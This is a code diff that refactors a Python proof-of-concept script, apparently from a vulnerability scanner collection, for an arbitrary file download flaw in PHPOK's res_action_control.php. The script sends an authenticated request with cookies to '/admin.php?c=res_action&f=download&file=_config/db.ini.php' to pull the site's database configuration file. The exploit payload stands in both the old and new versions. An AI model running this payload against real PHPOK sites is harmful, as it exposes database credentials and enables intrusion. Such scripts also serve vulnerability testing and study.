@@ -10,20 +10,13 @@ import sys
 import json
 import requests
 import warnings
-  
-
-
-class res_action_control_filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['phpok res_action_control.php 任意文件下载(需要cookies文件)','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/admin.php?c=res_action&f=download&file=_config/db.ini.php"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             f =  open(r'cookies.txt', 'r')
             cookies = {}
@@ -46,5 +39,4 @@ class res_action_control_filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = res_action_control_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
